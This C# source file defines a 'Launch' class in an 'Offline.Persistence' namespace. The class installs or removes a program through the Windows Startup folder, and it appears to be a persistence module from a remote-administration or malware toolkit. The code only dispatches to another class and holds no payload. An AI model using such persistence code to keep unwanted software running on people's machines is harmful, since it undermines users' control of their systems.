using System;
using System.Windows.Forms;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace Offline.Persistence
{
    public static class Launch
    {
        internal static string ProgramPath = Application.ExecutablePath;
        //internal static string ExecName = AppDomain.CurrentDomain.FriendlyName;

        public static void Install(Method method, params string[] settings)
        {
            switch (method) 
            {
                case Method.SHT_STARTUP_FOLDER:
                    StartupFolder.Install(settings[0], settings[0]);
                    break;

                default:
                    return;
            }
        }

        public static void Uninstall(Method method, params string[] settings)
        {
            switch (method)
            {
                case Method.SHT_STARTUP_FOLDER:
                    StartupFolder.Uninstall(settings[0], settings[0]);
                    break;

                default:
                    return;
            }
        }
    }
}
